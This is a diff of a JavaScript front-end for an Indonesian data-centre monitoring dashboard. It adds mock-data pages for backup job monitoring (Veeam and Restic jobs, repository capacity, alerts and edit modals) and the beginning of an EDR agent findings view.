             customPages.forEach(p => { const el2 = document.getElementById(p); if (el2) el2.style.display = 'none'; });
 
             if (pageId === 'dashboard') {
@@ -2792,6 +3089,18 @@
                 document.getElementById('default-page').style.display = 'none';
                 document.getElementById('nms-jipd-page').style.display = 'flex';
                 if (!nmsInitialized) { nmsInit(); nmsInitialized = true; } else { nmsRenderAll(); }
+            } else if (pageId === 'mon-edr') {
+                el.classList.add('active');
+                document.getElementById('content-container').style.display = 'none';
+                document.getElementById('default-page').style.display = 'none';
+                document.getElementById('nms-edr-page').style.display = 'flex';
+                if (!edrInitialized) { edrInit(); edrInitialized = true; } else { edrRenderAll(); }
+            } else if (pageId === 'mon-backup') {
+                el.classList.add('active');
+                document.getElementById('content-container').style.display = 'none';
+                document.getElementById('default-page').style.display = 'none';
+                document.getElementById('nms-backup-page').style.display = 'flex';
+                if (!bkInitialized) { bkInit(); bkInitialized = true; } else { bkRenderAll(); }
             } else {
                 el.classList.add('active');
                 document.getElementById('content-container').style.display = 'none';
@@ -8562,6 +8871,1155 @@
         const ov = document.getElementById('nms-modal-ov');
         const b  = document.getElementById('nms-modal-box');
         if (b) { b.style.transform = 'scale(.95)'; b.style.opacity = '0'; }
+        setTimeout(() => { if (ov) ov.style.display = 'none'; }, 200);
+    }
+
+    // =====================================================================
+    // ===== NMS BACKUP ====================================================
+    // =====================================================================
+
+    let bkCurrentFilter = 'all';
+    let bkInitialized   = false;
+
+    const bkStatusCfg = {
+        'Success':       { bg:'bg-emerald-100', tx:'text-emerald-700', dot:'bg-emerald-500', icon:'fa-check-circle',      label:'Berhasil' },
+        'Failed':        { bg:'bg-rose-100',    tx:'text-rose-700',    dot:'bg-rose-500',    icon:'fa-times-circle',      label:'Gagal' },
+        'Warning':       { bg:'bg-amber-100',   tx:'text-amber-700',   dot:'bg-amber-400',   icon:'fa-exclamation-circle',label:'Peringatan' },
+        'Not Configured':{ bg:'bg-slate-100',   tx:'text-slate-500',   dot:'bg-slate-300',   icon:'fa-minus-circle',      label:'Belum Dikonfigurasi' },
+        'Running':       { bg:'bg-blue-100',    tx:'text-blue-700',    dot:'bg-blue-500 nms-blink', icon:'fa-spinner fa-spin', label:'Berjalan' },
+    };
+
+    const bkRepos = [
+        { name:'Veeam Repo Primary',  type:'Veeam',    dc:'DC Utama',      cap_used:72,  cap_total:200, unit:'TB', status:'Online',  health:'OK'  },
+        { name:'Ceph HDD-01 Tier-2',  type:'Ceph HDD', dc:'DC Utama',      cap_used:55,  cap_total:100, unit:'PB', status:'Online',  health:'OK'  },
+        { name:'Ceph HDD-02 DR',      type:'Ceph HDD', dc:'DC Backup',     cap_used:41,  cap_total:100, unit:'PB', status:'Online',  health:'OK'  },
+        { name:'Restic S3 Offsite',   type:'S3/Restic', dc:'PDN Cikarang', cap_used:38,  cap_total:50,  unit:'TB', status:'Online',  health:'WARN' },
+    ];
+
+    function bkInit() {
+        bkRenderAll();
+        const el = document.getElementById('bk-last-refresh');
+        if (el) { el.textContent = 'Diperbarui: ' + new Date().toLocaleTimeString('id-ID'); el.classList.remove('hidden'); }
+    }
+
+    function bkRenderAll() {
+        bkRenderSummary();
+        bkRenderList();
+        bkRenderRepos();
+        bkRenderAlerts();
+    }
+
+    function bkRefresh() {
+        const icon = document.getElementById('bk-refresh-icon');
+        if (icon) { icon.classList.add('fa-spin'); setTimeout(() => icon.classList.remove('fa-spin'), 700); }
+        bkInit();
+    }
+
+    function bkGetFiltered() {
+        const q = (document.getElementById('bk-search')?.value || '').toLowerCase();
+        const f = bkCurrentFilter;
+        return (mockData.backup || []).filter(j => {
+            const st = j.bk_status || 'Not Configured';
+            if (f === 'success'        && st !== 'Success')       return false;
+            if (f === 'failed'         && st !== 'Failed')        return false;
+            if (f === 'warning'        && st !== 'Warning')       return false;
+            if (f === 'not_configured' && st !== 'Not Configured') return false;
+            if (f === 'veeam'          && j.tool !== 'veeam')     return false;
+            if (f === 'restic'         && j.tool !== 'restic')    return false;
+            if (q && ![j.vm, j.skpd].join(' ').toLowerCase().includes(q)) return false;
+            return true;
+        });
+    }
+
+    function bkRenderSummary() {
+        const all   = mockData.backup || [];
+        const total = all.length;
+        const success = all.filter(j => j.bk_status === 'Success').length;
+        const failed  = all.filter(j => j.bk_status === 'Failed').length;
+        const warn    = all.filter(j => j.bk_status === 'Warning').length;
+        const notCfg  = all.filter(j => j.bk_status === 'Not Configured').length;
+        const covered = all.filter(j => j.tool !== 'none').length;
+        const covPct  = total ? Math.round(covered / total * 100) : 0;
+        const veeamUsed = 680, veeamTotal = 800;
+        const veeamPct  = Math.round(veeamUsed / veeamTotal * 100);
+
+        const cards = [
+            {
+                icon:'fa-shield-alt', iconBg:'bg-violet-50', iconTx:'text-violet-500',
+                label:'VM Tercakup', val:`${covered}/${total}`,
+                sub:`${covPct}% dari total VM`,
+                bar:covPct, barCls: covPct < 80 ? 'bg-amber-400' : 'bg-emerald-500',
+                valTx:'text-violet-700',
+            },
+            {
+                icon:'fa-check-circle', iconBg:'bg-emerald-50', iconTx:'text-emerald-500',
+                label:'Berhasil Hari Ini', val:success,
+                sub:`${Math.round(success/(total||1)*100)}% dari semua job`,
+                bar:Math.round(success/(total||1)*100), barCls:'bg-emerald-500',
+                valTx:'text-emerald-600',
+            },
+            {
+                icon:'fa-exclamation-triangle', iconBg: (failed+warn) ? 'bg-rose-50' : 'bg-slate-50',
+                iconTx: (failed+warn) ? 'text-rose-500' : 'text-slate-400',
+                label:'Gagal / Peringatan', val:`${failed+warn}`,
+                sub:`${failed} gagal · ${warn} peringatan · ${notCfg} belum dikonfig`,
+                bar: Math.round((failed+warn)/(total||1)*100), barCls:'bg-rose-500',
+                valTx: (failed+warn) ? 'text-rose-600' : 'text-slate-400',
+            },
+            {
+                icon:'fa-key', iconBg: veeamPct >= 90 ? 'bg-rose-50' : 'bg-violet-50',
+                iconTx: veeamPct >= 90 ? 'text-rose-500' : 'text-violet-500',
+                label:'Lisensi Veeam', val:`${veeamUsed}/${veeamTotal}`,
+                sub:`${veeamPct}% terpakai · ${veeamTotal - veeamUsed} tersisa`,
+                bar:veeamPct, barCls: veeamPct >= 90 ? 'bg-rose-500' : veeamPct >= 75 ? 'bg-amber-400' : 'bg-violet-500',
+                valTx: veeamPct >= 90 ? 'text-rose-600' : 'text-violet-600',
+            },
+        ];
+
+        document.getElementById('bk-summary').innerHTML = cards.map(c => `
+            <div class="rounded-2xl border border-slate-100 bg-white p-4 shadow-sm">
+                <div class="flex items-center gap-2.5 mb-3">
+                    <div class="w-8 h-8 ${c.iconBg} rounded-xl flex items-center justify-center shrink-0">
+                        <i class="fas ${c.icon} ${c.iconTx} text-xs"></i>
+                    </div>
+                    <div class="flex-1 min-w-0">
+                        <p class="text-xs font-extrabold text-slate-800">${c.label}</p>
+                    </div>
+                    <span class="text-xl font-extrabold ${c.valTx}">${c.val}</span>
+                </div>
+                <div class="h-1.5 bg-slate-100 rounded-full overflow-hidden mb-2">
+                    <div class="h-full ${c.barCls} rounded-full transition-all" style="width:${c.bar}%"></div>
+                </div>
+                <p class="text-[8px] text-slate-400">${c.sub}</p>
+            </div>`).join('');
+    }
+
+    function bkSetFilter(f) {
+        bkCurrentFilter = f;
+        ['all','success','failed','warning','not_configured','veeam','restic'].forEach(k => {
+            const b = document.getElementById('bkf-' + k);
+            if (!b) return;
+            if (k === f) { b.classList.add('active'); }
+            else         { b.classList.remove('active'); }
+        });
+        bkRenderList();
+    }
+
+    function bkRenderList() {
+        const rows  = bkGetFiltered();
+        const badge = document.getElementById('bk-count-badge');
+        if (badge) badge.textContent = rows.length + ' job';
+        const tbody = document.getElementById('bk-job-tbody');
+        if (!tbody) return;
+        if (!rows.length) {
+            tbody.innerHTML = `<tr><td colspan="7" class="px-4 py-12 text-center">
+                <i class="fas fa-search text-3xl text-slate-200 block mb-3"></i>
+                <p class="text-xs font-bold text-slate-400">Tidak ada job sesuai filter</p></td></tr>`;
+            return;
+        }
+        tbody.innerHTML = rows.map(j => {
+            const st   = j.bk_status || 'Not Configured';
+            const cfg  = bkStatusCfg[st] || bkStatusCfg['Not Configured'];
+            const toolBadge = j.tool === 'veeam'  ? `<span class="text-[8px] font-extrabold text-violet-700 bg-violet-50 border border-violet-100 px-2 py-0.5 rounded-lg">Veeam</span>`
+                            : j.tool === 'restic' ? `<span class="text-[8px] font-extrabold text-blue-700 bg-blue-50 border border-blue-100 px-2 py-0.5 rounded-lg">Restic</span>`
+                            : `<span class="text-[8px] font-extrabold text-slate-400 bg-slate-50 border border-slate-100 px-2 py-0.5 rounded-lg">—</span>`;
+            const rowBg = st === 'Failed' ? 'bg-rose-50/30' : st === 'Warning' ? 'bg-amber-50/30' : '';
+            const lastBkTx = st === 'Failed' ? 'text-rose-600' : 'text-slate-700';
+            return `<tr class="bk-row border-b border-slate-50 last:border-0 ${rowBg}" onclick="bkOpenDetail(${j.id})">
+                <td class="px-4 py-3">
+                    <div class="flex flex-col items-center gap-0.5">
+                        <div class="w-2.5 h-2.5 rounded-full ${cfg.dot}"></div>
+                        <span class="text-[7px] font-extrabold ${cfg.tx}">${st === 'Not Configured' ? 'N/A' : st}</span>
+                    </div>
+                </td>
+                <td class="px-4 py-3">
+                    <p class="text-[10px] font-bold text-slate-800 leading-tight">${j.vm}</p>
+                    <p class="text-[8px] text-slate-400">${j.skpd}</p>
+                </td>
+                <td class="px-4 py-3">${toolBadge}</td>
+                <td class="px-4 py-3"><p class="text-[9px] font-bold text-slate-600">${j.schedule || '—'}</p></td>
+                <td class="px-4 py-3">
+                    <p class="text-[9px] font-bold ${lastBkTx}">${j.last_backup !== '-' ? j.last_backup : '—'}</p>
+                    ${j.history && j.history[0] && j.history[0].size && j.history[0].size !== '-'
+                        ? `<p class="text-[7px] text-slate-400">${j.history[0].tipe} · ${j.history[0].size}</p>` : ''}
+                </td>
+                <td class="px-4 py-3"><p class="text-[9px] font-bold text-slate-600">${j.retention || '—'}</p></td>
+                <td class="px-4 py-3">
+                    <div class="flex items-center gap-1 justify-end">
+                        <button onclick="event.stopPropagation();bkManualRun(${j.id})" title="Jalankan manual"
+                            class="w-7 h-7 flex items-center justify-center text-slate-400 bg-slate-50 hover:bg-violet-50 hover:text-violet-600 border border-slate-200 hover:border-violet-200 rounded-lg transition-colors text-[9px]">
+                            <i class="fas fa-play"></i></button>
+                        <button onclick="event.stopPropagation();bkShowEditModal(${j.id})" title="Edit"
+                            class="w-7 h-7 flex items-center justify-center text-slate-500 bg-slate-50 hover:bg-amber-50 hover:text-amber-600 border border-slate-200 hover:border-amber-200 rounded-lg transition-colors text-[9px]">
+                            <i class="fas fa-pen"></i></button>
+                        <button onclick="event.stopPropagation();bkConfirmDelete(${j.id})" title="Hapus"
+                            class="w-7 h-7 flex items-center justify-center text-slate-400 bg-slate-50 hover:bg-rose-50 hover:text-rose-600 border border-slate-200 hover:border-rose-200 rounded-lg transition-colors text-[9px]">
+                            <i class="fas fa-trash"></i></button>
+                    </div>
+                </td>
+            </tr>`;
+        }).join('');
+    }
+
+    function bkRenderRepos() {
+        document.getElementById('bk-repos').innerHTML = bkRepos.map(r => {
+            const pct = Math.round(r.cap_used / r.cap_total * 100);
+            const barCls = pct > 80 ? 'bg-rose-500' : pct > 60 ? 'bg-amber-400' : 'bg-emerald-500';
+            const txCls  = pct > 80 ? 'text-rose-600' : pct > 60 ? 'text-amber-600' : 'text-emerald-600';
+            const warnDot = r.health !== 'OK' ? `<span class="w-1.5 h-1.5 rounded-full bg-amber-400 shrink-0 nms-blink inline-block ml-1"></span>` : '';
+            return `<div class="rounded-xl border border-slate-100 bg-slate-50/50 p-3">
+                <div class="flex items-center justify-between mb-1.5">
+                    <div class="flex items-center gap-1.5">
+                        <i class="fas fa-hdd text-slate-400 text-[9px]"></i>
+                        <p class="text-[9px] font-extrabold text-slate-700">${r.name}${warnDot}</p>
+                    </div>
+                    <span class="text-[8px] font-extrabold ${txCls}">${pct}%</span>
+                </div>
+                <div class="h-1.5 bg-slate-100 rounded-full overflow-hidden mb-1">
+                    <div class="h-full ${barCls} rounded-full" style="width:${pct}%"></div>
+                </div>
+                <div class="flex justify-between">
+                    <span class="text-[7px] text-slate-400">${r.cap_used} ${r.unit} / ${r.cap_total} ${r.unit}</span>
+                    <span class="text-[7px] text-slate-400">${r.dc} · ${r.type}</span>
+                </div>
+            </div>`;
+        }).join('');
+    }
+
+    function bkRenderAlerts() {
+        const all     = mockData.backup || [];
+        const alerts  = all.filter(j => ['Failed','Warning'].includes(j.bk_status));
+        const badge   = document.getElementById('bk-alert-badge');
+        const list    = document.getElementById('bk-alert-list');
+        if (badge) { badge.textContent = alerts.length; badge.classList.toggle('hidden', alerts.length === 0); }
+        if (!list) return;
+        if (!alerts.length) {
+            list.innerHTML = `<div class="flex flex-col items-center py-10 text-slate-300">
+                <i class="fas fa-check-circle text-3xl text-emerald-400 mb-2"></i>
+                <p class="text-[9px] font-bold text-slate-400">Tidak ada job bermasalah</p>
+            </div>`;
+            return;
+        }
+        list.innerHTML = alerts.map(j => {
+            const st   = j.bk_status;
+            const cfg  = bkStatusCfg[st];
+            const fail = (j.history || []).find(h => h.status === 'Failed');
+            return `<div class="rounded-xl border p-3 cursor-pointer hover:bg-slate-50 ${st === 'Failed' ? 'border-rose-200 bg-rose-50/40' : 'border-amber-200 bg-amber-50/30'}"
+                        onclick="bkOpenDetail(${j.id})">
+                <div class="flex items-start gap-2">
+                    <i class="fas ${cfg.icon} ${cfg.tx} text-xs mt-0.5 shrink-0"></i>
+                    <div class="flex-1 min-w-0">
+                        <p class="text-[9px] font-extrabold text-slate-800 truncate">${j.vm}</p>
+                        <p class="text-[8px] text-slate-500">${j.skpd}</p>
+                        ${fail ? `<p class="text-[8px] ${cfg.tx} mt-1 line-clamp-2">${fail.inc_ket || ''}</p>
+                                  ${fail.inc_no ? `<span class="text-[7px] font-extrabold text-slate-500 bg-slate-100 px-1.5 py-0.5 rounded mt-1 inline-block">${fail.inc_no}</span>` : ''}` : ''}
+                    </div>
+                </div>
+            </div>`;
+        }).join('');
+    }
+
+    // ── Detail modal ──
+    function bkOpenDetail(id) {
+        const j = (mockData.backup || []).find(x => x.id === id);
+        if (!j) return;
+        const st  = j.bk_status || 'Not Configured';
+        const cfg = bkStatusCfg[st] || bkStatusCfg['Not Configured'];
+        const toolLabel = j.tool === 'veeam' ? 'Veeam B&R' : j.tool === 'restic' ? 'Restic' : 'Tidak Dikonfigurasi';
+        const histRows = (j.history || []).map(h => {
+            const sc = h.status === 'Success' ? 'text-emerald-600' : h.status === 'Failed' ? 'text-rose-600' : 'text-amber-600';
+            const ic = h.status === 'Success' ? 'fa-check-circle text-emerald-500' : h.status === 'Failed' ? 'fa-times-circle text-rose-500' : 'fa-exclamation-circle text-amber-400';
+            return `<tr class="border-b border-slate-50 last:border-0">
+                <td class="px-3 py-2.5">
+                    <div class="flex items-center gap-1.5">
+                        <i class="fas ${ic} text-[9px]"></i>
+                        <span class="text-[9px] font-bold ${sc}">${h.status}</span>
+                    </div>
+                </td>
+                <td class="px-3 py-2.5 text-[9px] text-slate-600">${h.tgl}</td>
+                <td class="px-3 py-2.5"><span class="text-[8px] font-bold px-2 py-0.5 rounded ${h.tipe==='Full'?'bg-violet-50 text-violet-700':'bg-slate-100 text-slate-600'}">${h.tipe}</span></td>
+                <td class="px-3 py-2.5 text-[9px] font-bold text-slate-700">${h.size || '—'}</td>
+                <td class="px-3 py-2.5">${h.inc_no ? `<a href="#" class="text-[8px] font-extrabold text-rose-600 bg-rose-50 border border-rose-200 px-2 py-0.5 rounded-lg">${h.inc_no}</a>` : ''}</td>
+            </tr>`;
+        }).join('');
+
+        bkShowModal(`
+            <div class="p-5 border-b border-slate-100 bg-gradient-to-r from-violet-50 to-white flex items-start gap-3">
+                <div class="w-10 h-10 bg-violet-100 rounded-2xl flex items-center justify-center shrink-0">
+                    <i class="fas fa-database text-violet-600"></i>
+                </div>
+                <div class="flex-1 min-w-0">
+                    <h3 class="font-extrabold text-slate-800 text-sm leading-tight">${j.vm}</h3>
+                    <p class="text-[9px] text-slate-500 mt-0.5">${j.skpd}</p>
+                    <span class="inline-flex items-center gap-1 mt-1 text-[8px] font-extrabold ${cfg.tx} ${cfg.bg} px-2 py-0.5 rounded-full">
+                        <i class="fas ${cfg.icon} text-[8px]"></i>${cfg.label}
+                    </span>
+                </div>
+                <button onclick="bkCloseModal()" class="text-slate-400 hover:text-slate-600 text-lg shrink-0"><i class="fas fa-times"></i></button>
+            </div>
+            <!-- Info grid -->
+            <div class="p-5 grid grid-cols-2 gap-4 border-b border-slate-100">
+                <div class="bg-slate-50 rounded-xl p-3 space-y-2">
+                    <p class="text-[8px] font-extrabold text-slate-400 uppercase tracking-widest mb-2">Konfigurasi</p>
+                    <div class="flex justify-between"><span class="text-[9px] text-slate-500">Tool</span><span class="text-[9px] font-bold text-slate-800">${toolLabel}</span></div>
+                    <div class="flex justify-between"><span class="text-[9px] text-slate-500">Jadwal</span><span class="text-[9px] font-bold text-slate-800">${j.schedule || '—'}</span></div>
+                    <div class="flex justify-between"><span class="text-[9px] text-slate-500">Retensi</span><span class="text-[9px] font-bold text-slate-800">${j.retention || '—'}</span></div>
+                </div>
+                <div class="bg-slate-50 rounded-xl p-3 space-y-2">
+                    <p class="text-[8px] font-extrabold text-slate-400 uppercase tracking-widest mb-2">Status Terakhir</p>
+                    <div class="flex justify-between"><span class="text-[9px] text-slate-500">Last Backup</span><span class="text-[9px] font-bold text-slate-800">${j.last_backup !== '-' ? j.last_backup : '—'}</span></div>
+                    ${j.history && j.history[0] ? `
+                    <div class="flex justify-between"><span class="text-[9px] text-slate-500">Tipe</span><span class="text-[9px] font-bold text-slate-800">${j.history[0].tipe}</span></div>
+                    <div class="flex justify-between"><span class="text-[9px] text-slate-500">Ukuran</span><span class="text-[9px] font-bold text-slate-800">${j.history[0].size || '—'}</span></div>` : ''}
+                </div>
+            </div>
+            <!-- History -->
+            <div class="p-5">
+                <p class="text-[9px] font-extrabold text-slate-500 uppercase tracking-widest mb-3">Riwayat Backup (${j.history?.length || 0} entri)</p>
+                ${j.history && j.history.length ? `
+                <table class="w-full">
+                    <thead><tr class="bg-slate-50 text-[8px] font-extrabold text-slate-400 uppercase tracking-widest">
+                        <th class="px-3 py-2 text-left w-24">Status</th>
+                        <th class="px-3 py-2 text-left">Waktu</th>
+                        <th class="px-3 py-2 text-left w-24">Tipe</th>
+                        <th class="px-3 py-2 text-left w-20">Ukuran</th>
+                        <th class="px-3 py-2 text-left w-20">Insiden</th>
+                    </tr></thead>
+                    <tbody>${histRows}</tbody>
+                </table>` : `<p class="text-[9px] text-slate-400 text-center py-4">Belum ada riwayat backup</p>`}
+                ${j.history && j.history.find(h=>h.inc_ket) ? `
+                <div class="mt-3 p-3 bg-rose-50 border border-rose-200 rounded-xl">
+                    <p class="text-[8px] font-extrabold text-rose-700 mb-1">Catatan Kegagalan:</p>
+                    <p class="text-[8px] text-rose-600">${j.history.find(h=>h.inc_ket)?.inc_ket}</p>
+                </div>` : ''}
+            </div>
+            <!-- Actions -->
+            <div class="px-5 pb-5 flex gap-2 justify-end">
+                <button onclick="bkCloseModal();bkManualRun(${j.id})" class="flex items-center gap-1.5 text-[9px] font-extrabold text-violet-600 bg-violet-50 hover:bg-violet-100 border border-violet-200 px-4 py-2 rounded-xl transition-colors">
+                    <i class="fas fa-play text-[8px]"></i>Jalankan Sekarang
+                </button>
+                <button onclick="bkCloseModal();bkShowEditModal(${j.id})" class="flex items-center gap-1.5 text-[9px] font-extrabold text-amber-600 bg-amber-50 hover:bg-amber-100 border border-amber-200 px-4 py-2 rounded-xl transition-colors">
+                    <i class="fas fa-pen text-[8px]"></i>Edit Konfigurasi
+                </button>
+                <button onclick="bkCloseModal()" class="text-[9px] font-extrabold text-slate-500 bg-slate-100 hover:bg-slate-200 px-4 py-2 rounded-xl transition-colors">Tutup</button>
+            </div>`);
+    }
+
+    // ── Add/Edit modal ──
+    function bkShowAddModal() {
+        bkShowModal(_bkFormHtml(null));
+    }
+
+    function bkShowEditModal(id) {
+        const j = (mockData.backup || []).find(x => x.id === id);
+        bkShowModal(_bkFormHtml(j));
+    }
+
+    function _bkFormHtml(j) {
+        const isEdit = !!j;
+        return `
+            <div class="p-5 border-b border-slate-100 flex items-center justify-between">
+                <h3 class="text-sm font-extrabold text-slate-800">${isEdit ? 'Edit Konfigurasi Backup' : 'Tambah Job Backup'}</h3>
+                <button onclick="bkCloseModal()" class="text-slate-400 hover:text-slate-600 text-lg"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="p-5 space-y-4">
+                <div>
+                    <label class="text-[9px] font-extrabold text-slate-500 uppercase tracking-widest block mb-1.5">Nama VM <span class="text-rose-400">*</span></label>
+                    <input id="bk-f-vm" type="text" value="${isEdit ? j.vm : ''}" placeholder="vm-skpd-aplikasi-01"
+                        class="w-full px-3 py-2 text-[10px] border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-violet-300">
+                </div>
+                <div>
+                    <label class="text-[9px] font-extrabold text-slate-500 uppercase tracking-widest block mb-1.5">SKPD / Instansi <span class="text-rose-400">*</span></label>
+                    <select id="bk-f-skpd" class="w-full px-3 py-2 text-[10px] border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-violet-300 bg-white">
+                        ${['Dinas Kesehatan','Bappeda','Diskominfo','BPBD','BPKAD','Dinas Pendidikan','Dinas Sosial','Dishub','Dispusda'].map(s => `<option ${isEdit && j.skpd===s ? 'selected' : ''}>${s}</option>`).join('')}
+                    </select>
+                </div>
+                <div class="grid grid-cols-2 gap-3">
+                    <div>
+                        <label class="text-[9px] font-extrabold text-slate-500 uppercase tracking-widest block mb-1.5">Tool Backup</label>
+                        <select id="bk-f-tool" class="w-full px-3 py-2 text-[10px] border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-violet-300 bg-white">
+                            <option value="veeam"  ${isEdit && j.tool==='veeam'  ? 'selected' : ''}>Veeam B&R</option>
+                            <option value="restic" ${isEdit && j.tool==='restic' ? 'selected' : ''}>Restic</option>
+                            <option value="none"   ${isEdit && j.tool==='none'   ? 'selected' : ''}>Belum Dikonfigurasi</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label class="text-[9px] font-extrabold text-slate-500 uppercase tracking-widest block mb-1.5">Retensi</label>
+                        <select id="bk-f-retention" class="w-full px-3 py-2 text-[10px] border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-violet-300 bg-white">
+                            ${['7 hari','14 hari','30 hari','60 hari','90 hari'].map(r => `<option ${isEdit && j.retention===r ? 'selected' : ''}>${r}</option>`).join('')}
+                        </select>
+                    </div>
+                </div>
+                <div>
+                    <label class="text-[9px] font-extrabold text-slate-500 uppercase tracking-widest block mb-1.5">Jadwal Backup</label>
+                    <input id="bk-f-schedule" type="text" value="${isEdit ? j.schedule : 'Daily 01:00'}" placeholder="Contoh: Daily 01:00 / Weekly Sun 02:00"
+                        class="w-full px-3 py-2 text-[10px] border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-violet-300">
+                    <p class="text-[8px] text-slate-400 mt-1">Format: Daily HH:MM | Weekly Hari HH:MM | Monthly Tgl HH:MM</p>
+                </div>
+            </div>
+            <div class="px-5 pb-5 flex gap-2 justify-end border-t border-slate-100 pt-4">
+                <button onclick="bkCloseModal()" class="text-[9px] font-extrabold text-slate-500 bg-slate-100 hover:bg-slate-200 px-4 py-2 rounded-xl transition-colors">Batal</button>
+                <button onclick="bkSave(${isEdit ? j.id : 'null'})" class="flex items-center gap-1.5 text-[9px] font-extrabold text-white bg-violet-600 hover:bg-violet-700 px-5 py-2 rounded-xl transition-colors">
+                    <i class="fas fa-save text-[8px]"></i>${isEdit ? 'Simpan Perubahan' : 'Tambah Job'}
+                </button>
+            </div>`;
+    }
+
+    function bkSave(id) {
+        const vm        = document.getElementById('bk-f-vm')?.value.trim();
+        const skpd      = document.getElementById('bk-f-skpd')?.value;
+        const tool      = document.getElementById('bk-f-tool')?.value;
+        const retention = document.getElementById('bk-f-retention')?.value;
+        const schedule  = document.getElementById('bk-f-schedule')?.value.trim();
+        if (!vm) { alert('Nama VM wajib diisi.'); return; }
+        if (id) {
+            const j = mockData.backup.find(x => x.id === id);
+            if (j) Object.assign(j, { vm, skpd, tool, retention, schedule: tool === 'none' ? '-' : schedule,
+                bk_status: tool === 'none' ? 'Not Configured' : j.bk_status });
+            frmToast('Konfigurasi backup berhasil diperbarui.', 'emerald');
+        } else {
+            mockData.backup.push({ id: Date.now(), vm, skpd, tool, retention: tool === 'none' ? '-' : retention,
+                schedule: tool === 'none' ? '-' : schedule, last_backup: '-', bk_status: tool === 'none' ? 'Not Configured' : 'Success', history: [] });
+            frmToast('Job backup berhasil ditambahkan.', 'violet');
+        }
+        bkCloseModal(); bkRenderAll();
+    }
+
+    // ── Delete modal ──
+    function bkConfirmDelete(id) {
+        const j = (mockData.backup || []).find(x => x.id === id);
+        if (!j) return;
+        bkShowModal(`
+            <div class="p-5 border-b border-slate-100 flex items-center justify-between">
+                <h3 class="text-sm font-extrabold text-slate-800">Hapus Job Backup</h3>
+                <button onclick="bkCloseModal()" class="text-slate-400 hover:text-slate-600 text-lg"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="p-5 text-center">
+                <div class="w-14 h-14 bg-rose-50 rounded-2xl flex items-center justify-center mx-auto mb-3">
+                    <i class="fas fa-trash text-rose-500 text-xl"></i>
+                </div>
+                <p class="text-sm font-extrabold text-slate-800 mb-1">Hapus job ini?</p>
+                <p class="text-[10px] text-slate-500 mb-1 font-mono">${j.vm}</p>
+                <p class="text-[9px] text-slate-400 mb-4">Seluruh riwayat backup dari job ini akan dihapus dari sistem. Tindakan ini tidak dapat dibatalkan.</p>
+                <div class="flex gap-2 justify-center">
+                    <button onclick="bkCloseModal()" class="text-[9px] font-extrabold text-slate-500 bg-slate-100 hover:bg-slate-200 px-5 py-2.5 rounded-xl transition-colors">Batal</button>
+                    <button onclick="bkDelete(${id})" class="text-[9px] font-extrabold text-white bg-rose-600 hover:bg-rose-700 px-5 py-2.5 rounded-xl transition-colors">
+                        <i class="fas fa-trash mr-1.5 text-[8px]"></i>Ya, Hapus
+                    </button>
+                </div>
+            </div>`);
+    }
+
+    function bkDelete(id) {
+        mockData.backup = mockData.backup.filter(x => x.id !== id);
+        bkCloseModal(); bkRenderAll();
+        frmToast('Job backup berhasil dihapus.', 'rose');
+    }
+
+    // ── Manual run ──
+    function bkManualRun(id) {
+        const j = (mockData.backup || []).find(x => x.id === id);
+        if (!j || j.tool === 'none') {
+            frmToast('Job ini belum dikonfigurasi. Tambahkan konfigurasi backup terlebih dahulu.', 'amber');
+            return;
+        }
+        frmToast(`Backup manual untuk ${j.vm} telah dijadwalkan. Proses akan berjalan dalam beberapa detik.`, 'violet');
+    }
+
+    // ── Modal helpers ──
+    function bkShowModal(html) {
+        const ov = document.getElementById('bk-modal-ov');
+        const box = document.getElementById('bk-modal-box');
+        if (!ov || !box) return;
+        box.innerHTML = html;
+        ov.style.display = 'flex';
+        setTimeout(() => { box.style.transform = 'scale(1)'; box.style.opacity = '1'; }, 10);
+    }
+
+    function bkCloseModal() {
+        const ov  = document.getElementById('bk-modal-ov');
+        const box = document.getElementById('bk-modal-box');
+        if (box) { box.style.transform = 'scale(.95)'; box.style.opacity = '0'; }
+        setTimeout(() => { if (ov) ov.style.display = 'none'; }, 200);
+    }
+
+    // =====================================================================
+    // ===== NMS EDR =======================================================
+    // =====================================================================
+
+    let edrInitialized    = false;
+    let edrCurrentFilter  = 'all';
+    let edrFindingFilter  = 'all';
+    let edrCurrentTab     = 'agents';
+    let edrAllFindings    = [];   // flat array derived from all agents' malicious_log
+    let edrNextIncNo      = 221; // next INC number to assign
+
+    const edrSeverityCfg = {
+        'Critical': { bg:'bg-rose-100',   tx:'text-rose-700',   border:'border-rose-200',   dot:'bg-rose-500',   icon:'fa-skull-crossbones', rank:4 },
+        'High':     { bg:'bg-orange-100', tx:'text-orange-700', border:'border-orange-200', dot:'bg-orange-500', icon:'fa-exclamation-triangle', rank:3 },
+        'Medium':   { bg:'bg-amber-100',  tx:'text-amber-700',  border:'border-amber-200',  dot:'bg-amber-400',  icon:'fa-exclamation-circle', rank:2 },
+        'Low':      { bg:'bg-slate-100',  tx:'text-slate-600',  border:'border-slate-200',  dot:'bg-slate-400',  icon:'fa-info-circle', rank:1 },
+    };
+
+    const edrActionCfg = {
+        'Quarantined': { bg:'bg-violet-100', tx:'text-violet-700', icon:'fa-box' },
+        'Blocked':     { bg:'bg-blue-100',   tx:'text-blue-700',   icon:'fa-ban' },
+        'Detected':    { bg:'bg-rose-100',   tx:'text-rose-700',   icon:'fa-eye' },
+        'Killed':      { bg:'bg-emerald-100',tx:'text-emerald-700',icon:'fa-skull' },
+    };
+
+    const edrStatusCfg = {
+        'licensed':   { label:'Licensed',   bg:'bg-emerald-50', tx:'text-emerald-700', border:'border-emerald-100', dot:'bg-emerald-500' },
+        'unlicensed': { label:'Unlicensed', bg:'bg-amber-50',   tx:'text-amber-700',   border:'border-amber-100',   dot:'bg-amber-400' },
+        'none':       { label:'No Agent',   bg:'bg-slate-100',  tx:'text-slate-500',   border:'border-slate-200',   dot:'bg-slate-300' },
+    };
+
+    function edrBuildFindings() {
+        edrAllFindings = [];
+        (mockData.edr || []).forEach(agent => {
+            (agent.malicious_log || []).forEach((f, idx) => {
+                edrAllFindings.push({ ...f, _vm_id: agent.id, _vm: agent.vm, _skpd: agent.skpd, _idx: idx });
+            });
+        });
+        // Sort by severity rank desc, then by date desc
+        edrAllFindings.sort((a, b) => {
+            const ra = (edrSeverityCfg[a.severity]?.rank || 0);
